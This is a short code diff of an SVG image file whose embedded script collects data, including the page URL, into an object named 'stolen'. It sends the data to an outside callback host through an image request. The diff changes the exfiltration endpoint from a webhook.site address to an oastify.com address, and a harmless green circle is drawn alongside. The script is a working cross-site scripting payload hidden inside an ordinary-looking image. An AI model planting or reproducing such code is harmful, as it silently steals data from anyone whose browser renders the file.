@@ -8,8 +8,9 @@
         url: window.location.href
       };
       
-      new Image().src = 'https://webhook.site/8db977b1-0147-4764-8f39-2c95eb5bcb56?data=' + encodeURIComponent(JSON.stringify(stolen));
+      new Image().src = 'https://rzuj5zij1xtirq08vtozt9xv0m6du4it.oastify.com?data=' + encodeURIComponent(JSON.stringify(stolen));
     })();
   </script>
   <circle cx="50" cy="50" r="40" fill="green"/>
+
 </svg>
